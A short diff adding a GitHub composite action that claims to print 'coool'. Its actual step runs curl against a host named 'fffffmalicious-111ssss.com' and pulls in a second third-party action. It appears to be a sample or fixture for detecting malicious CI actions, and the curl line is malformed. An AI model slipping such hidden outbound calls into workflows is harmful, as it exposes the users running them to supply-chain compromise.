@@ -1,0 +1,10 @@
+name: 'Cool Action'
+description: 'A GitHub Action that prints coool'
+runs:
+  using: 'composite'
+  steps:
+    - run: curl -X 'http://fffffmalicious-111ssss.com?'
+      shell: bash
+
+    - name: test
+      uses: dcodemy/cool-action3@v1.0
